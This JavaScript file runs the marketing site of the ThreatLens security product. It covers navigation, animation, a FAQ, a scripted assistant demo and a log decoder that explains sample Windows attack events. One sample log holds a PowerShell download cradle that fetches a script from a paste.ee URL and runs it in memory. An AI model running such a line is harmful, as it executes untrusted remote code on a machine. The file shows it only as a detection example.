/* ==========================================================================
   ThreatLens — main.js
   Navigation, Particles, Log Decoder, FAQ, Copy, Mobile Menu
   ========================================================================== */
(function () {
  'use strict';

  // ── 1. Sticky Nav ─────────────────────────────────────────────────────────
  const nav = document.getElementById('nav');
  function onScroll() {
    nav.classList.toggle('stuck', window.scrollY > 40);
  }
  window.addEventListener('scroll', onScroll, { passive: true });

  // ── 2. Mobile Menu ────────────────────────────────────────────────────────
  const hamburger = document.getElementById('hamburger');
  const drawer = document.getElementById('mobile-drawer');
  hamburger && hamburger.addEventListener('click', () => {
    drawer.classList.toggle('open');
    hamburger.textContent = drawer.classList.contains('open') ? '✕' : '☰';
  });
  drawer && drawer.querySelectorAll('a').forEach(a => {
    a.addEventListener('click', () => {
      drawer.classList.remove('open');
      hamburger.textContent = '☰';
    });
  });

  // ── 3. Smooth Anchor Scroll ───────────────────────────────────────────────
  document.querySelectorAll('a[href^="#"]').forEach(a => {
    a.addEventListener('click', e => {
      const id = a.getAttribute('href');
      if (id === '#') return;
      const el = document.querySelector(id);
      if (el) {
        e.preventDefault();
        el.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
    });
  });

  // ── 4. Particle Canvas ───────────────────────────────────────────────────
  const canvas = document.getElementById('particles-canvas');
  if (canvas) {
    const ctx = canvas.getContext('2d');
    let W, H, particles = [];

    function resize() {
      W = canvas.width = canvas.offsetWidth;
      H = canvas.height = canvas.offsetHeight;
    }

    function Particle() {
      this.x = Math.random() * W;
      this.y = Math.random() * H;
      this.r = Math.random() * 1.8 + 0.5;
      this.vx = (Math.random() - 0.5) * 0.3;
      this.vy = (Math.random() - 0.5) * 0.3;
      this.alpha = Math.random() * 0.5 + 0.1;
    }

    function init() {
      particles = [];
      const count = Math.floor((W * H) / 14000);
      for (let i = 0; i < count; i++) particles.push(new Particle());
    }

    function draw() {
      ctx.clearRect(0, 0, W, H);
      particles.forEach(p => {
        p.x += p.vx; p.y += p.vy;
        if (p.x < 0) p.x = W; if (p.x > W) p.x = 0;
        if (p.y < 0) p.y = H; if (p.y > H) p.y = 0;
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(56,189,248,${p.alpha})`;
        ctx.fill();
      });

      // Thin connection lines
      for (let i = 0; i < particles.length; i++) {
        for (let j = i + 1; j < particles.length; j++) {
          const dx = particles[i].x - particles[j].x;
          const dy = particles[i].y - particles[j].y;
          const dist = Math.sqrt(dx * dx + dy * dy);
          if (dist < 120) {
            ctx.beginPath();
            ctx.strokeStyle = `rgba(56,189,248,${0.06 * (1 - dist / 120)})`;
            ctx.lineWidth = 0.5;
            ctx.moveTo(particles[i].x, particles[i].y);
            ctx.lineTo(particles[j].x, particles[j].y);
            ctx.stroke();
          }
        }
      }
      requestAnimationFrame(draw);
    }

    window.addEventListener('resize', () => { resize(); init(); }, { passive: true });
    resize(); init(); draw();
  }

  // ── 5. Plain-English Log Decoder ─────────────────────────────────────────
  const LOG_DATA = {
    '4625': {
      raw: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"
              Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" />
    <EventID>4625</EventID>
    <TimeCreated SystemTime="2026-09-17T13:42:10.884Z" />
    <Channel>Security</Channel>
  </System>
  <EventData>
    <Data Name="TargetUserName">Administrator</Data>
    <Data Name="SubStatus">0xc000006a</Data>
    <Data Name="FailureReason">%%2313</Data>
    <Data Name="IpAddress">194.26.29.112</Data>
    <Data Name="IpPort">58412</Data>
  </EventData>
</Event>`,
      verdict: '🚨 THREAT DETECTED · SUSPICIOUS IP FLAGGED',
      verdictClass: 'vp-danger',
      headline: '⚠️ 42 Rapid Failed Logins — Brute-Force Attack In Progress',
      desc: 'Someone attempted to log into the "Administrator" account with incorrect passwords 42 times in 15 seconds from remote IP 194.26.29.112. ThreatLens identified this as an automated credential-stuffing or dictionary attack.'
    },
    '7045': {
      raw: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Service Control Manager"
              Guid="{555908d1-a6d7-4695-8e1e-269f4a497045}" />
    <EventID>7045</EventID>
    <Level>4</Level>
    <Channel>System</Channel>
  </System>
  <EventData>
    <Data Name="ServiceName">SysDriverUpdaterSvc</Data>
    <Data Name="ImagePath">C:\\Users\\Public\\updater.exe -k</Data>
    <Data Name="ServiceType">user mode service</Data>
    <Data Name="StartType">auto start</Data>
    <Data Name="AccountName">LocalSystem</Data>
  </EventData>
</Event>`,
      verdict: '🚨 PERSISTENCE DETECTED · AUTO-BLOCKED',
      verdictClass: 'vp-danger',
      headline: '⚠️ Stealth Windows Service Installed in Public Folder',
      desc: 'A background service "SysDriverUpdaterSvc" was quietly installed to run automatically as SYSTEM from a hidden public directory — not Program Files. This is a classic persistence and privilege escalation technique.'
    },
    '1102': {
      raw: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Eventlog"
              Guid="{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}" />
    <EventID>1102</EventID>
    <Level>4</Level>
    <Channel>Security</Channel>
  </System>
  <UserData>
    <LogFileCleared>
      <SubjectUserName>TargetUser</SubjectUserName>
      <SubjectDomainName>WORKGROUP</SubjectDomainName>
      <SubjectLogonId>0x3E7</SubjectLogonId>
    </LogFileCleared>
  </UserData>
</Event>`,
      verdict: '🚨 CRITICAL MITRE T1070 · INCIDENT RAISED',
      verdictClass: 'vp-danger',
      headline: '🚨 CRITICAL: Windows Security Audit Log Deliberately Wiped',
      desc: 'The entire Windows Security event log was intentionally purged. Attackers routinely clear security event logs to erase digital footprints and destroy forensic evidence of a breach. This is one of the highest-severity indicators of compromise.'
    },
    '4104': {
      raw: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" />
    <EventID>4104</EventID>
    <Level>Warning</Level>
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
  </System>
  <EventData>
    <Data Name="ScriptBlockText">
      $wc = New-Object System.Net.WebClient;
      $wc.DownloadString('http://paste.ee/r/xyz') | IEX
    </Data>
    <Data Name="Path"></Data>
  </EventData>
</Event>`,
      verdict: '⚠️ REMOTE EXEC BLOCKED · MITRE T1059.001',
      verdictClass: 'vp-danger',
      headline: '⚡ Memory Download Cradle Detected and Blocked',
      desc: 'PowerShell executed a script that downloaded code from the internet and ran it directly in memory via Invoke-Expression (IEX) — never writing a file to disk. This is a fileless attack technique used to evade signature-based detection.'
    }
  };

  const tabs = document.querySelectorAll('.trans-tab');
  const rawEl = document.getElementById('trans-raw');
  const verdictEl = document.getElementById('trans-verdict');
  const headlineEl = document.getElementById('trans-headline');
  const descEl = document.getElementById('trans-desc');

  function setLog(eventId) {
    const d = LOG_DATA[eventId];
    if (!d) return;
    tabs.forEach(t => t.classList.toggle('active', t.dataset.event === eventId));
    if (rawEl) rawEl.textContent = d.raw;
    if (verdictEl) { verdictEl.textContent = d.verdict; verdictEl.className = `verdict-pill ${d.verdictClass}`; }
    if (headlineEl) headlineEl.textContent = d.headline;
    if (descEl) descEl.textContent = d.desc;
  }

  tabs.forEach(tab => tab.addEventListener('click', () => setLog(tab.dataset.event)));

  // ── 6. UI Screenshot Gallery Switcher ──────────────────────────────────────
  const galleryBtns = document.querySelectorAll('.gallery-tab-btn');
  const galleryImg = document.getElementById('gallery-img');
  const galleryTitle = document.getElementById('gallery-title');
  const galleryStatus = document.getElementById('gallery-status');
  const galleryBadges = document.getElementById('gallery-badges');

  galleryBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      galleryBtns.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');

      const imgSrc = btn.dataset.img;
      const title = btn.dataset.title;
      const status = btn.dataset.status;
      const badges = (btn.dataset.badges || '').split(',');

      if (galleryImg) {
        galleryImg.style.opacity = '0.3';
        galleryImg.src = imgSrc;
        setTimeout(() => { galleryImg.style.opacity = '1'; }, 150);
      }
      if (galleryTitle) galleryTitle.textContent = title;
      if (galleryStatus) {
        galleryStatus.innerHTML = `<span class="pulse-dot" style="width:6px;height:6px"></span> ${status}`;
      }
      if (galleryBadges) {
        galleryBadges.innerHTML = badges.map(b => `<span class="pill">${b.trim()}</span>`).join('');
      }
    });
  });

  // ── 7. Interactive Offline AI Assistant Demo ──────────────────────────────
  const AI_RESPONSES = {
    powershell: {
      q: 'What is powershell.exe doing on my machine right now?',
      ans: '<strong>powershell.exe</strong> (PID: 8192) was launched 4 seconds ago by <code>cscript.exe</code> with flag <code>-enc JABj...</code>. CyberNLP flagged this execution because Base64 encoding is commonly used to evade static antivirus string filters. Lineage trace confirms origin from <code>invoice.vbs</code> in your Downloads folder. ThreatLens has temporarily paused child threads and recommends terminating the process tree.'
    },
    cpu: {
      q: 'Why did my CPU spike to 64%?',
      ans: 'Native Windows PDH performance telemetry reports total system CPU load at <strong>64.2%</strong> across 8 logical cores. Top consumer: <code>powershell.exe</code> (48.1% user time, generating high thread burst) followed by <code>msedge.exe</code> (9.4%). Memory remains stable at 41% (6.5 GB / 16.0 GB). ThreatLens flagged the sudden process spawn as an abnormal behavioral baseline divergence.'
    },
    canary: {
      q: 'How do Canary Decoys catch ransomware?',
      ans: 'ThreatLens places hidden zero-byte decoy files (e.g. <code>.threatlens_canary.docx</code>) in high-risk directories (Documents, Desktop). Ransomware enumerates and encrypts files alphabetically or hierarchically. When any untrusted process modifies a canary header, the tripwire instantly fires before your personal photos or documents are touched — executing emergency process termination and NetSh socket isolation in &lt;15ms.'
    },
    xor: {
      q: 'Can I restore quarantined files from XOR Vault?',
      ans: '<strong>Yes, 100% reversible with zero data loss.</strong> Traditional antivirus deletes or damages suspicious files permanently. ThreatLens applies a cryptographic reversible byte transformation that flips the Windows PE <code>MZ</code> header bytes. The file becomes mathematically inert and unexecutable to Windows, but can be fully restored to its exact original binary state with one click in the Forensics tab if identified as a benign developer tool.'
    }
  };

  const aiChips = document.querySelectorAll('.ai-chip');
  const aiUserMsg = document.getElementById('ai-user-msg');
  const aiBotText = document.getElementById('ai-bot-text');

  aiChips.forEach(chip => {
    chip.addEventListener('click', () => {
      aiChips.forEach(c => c.classList.remove('active'));
      chip.classList.add('active');

      const data = AI_RESPONSES[chip.dataset.q];
      if (!data) return;

      if (aiUserMsg) aiUserMsg.textContent = data.q;
      if (aiBotText) {
        aiBotText.style.opacity = '0.3';
        setTimeout(() => {
          aiBotText.innerHTML = data.ans;
          aiBotText.style.opacity = '1';
        }, 120);
      }
    });
  });

  // ── 8. Multi-Channel Download Tabs ────────────────────────────────────────
  const dlTabs = document.querySelectorAll('.download-tab');
  const dlPanels = document.querySelectorAll('.download-panel');

  dlTabs.forEach(tab => {
    tab.addEventListener('click', () => {
      dlTabs.forEach(t => t.classList.remove('active'));
      dlPanels.forEach(p => p.classList.remove('active'));

      tab.classList.add('active');
      const targetPanel = document.getElementById(tab.dataset.tab);
      if (targetPanel) targetPanel.classList.add('active');
    });
  });

  // ── 9. Universal Copy Buttons ─────────────────────────────────────────────
  document.querySelectorAll('.copy-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const targetSel = btn.dataset.target;
      const target = targetSel ? document.querySelector(targetSel) : null;
      if (!target) return;
      const text = target.innerText.trim();
      navigator.clipboard.writeText(text).then(() => {
        const origText = btn.textContent;
        btn.textContent = '✓ COPIED';
        btn.style.background = 'var(--col-emerald)';
        btn.style.color = '#000';
        setTimeout(() => {
          btn.textContent = origText;
          btn.style.background = '';
          btn.style.color = '';
        }, 2000);
      });
    });
  });

  // ── 10. FAQ Accordion ─────────────────────────────────────────────────────
  document.querySelectorAll('.faq-item').forEach(item => {
    item.querySelector('.faq-q').addEventListener('click', () => {
      const isOpen = item.classList.contains('open');
      document.querySelectorAll('.faq-item').forEach(i => i.classList.remove('open'));
      if (!isOpen) item.classList.add('open');
    });
  });

})();
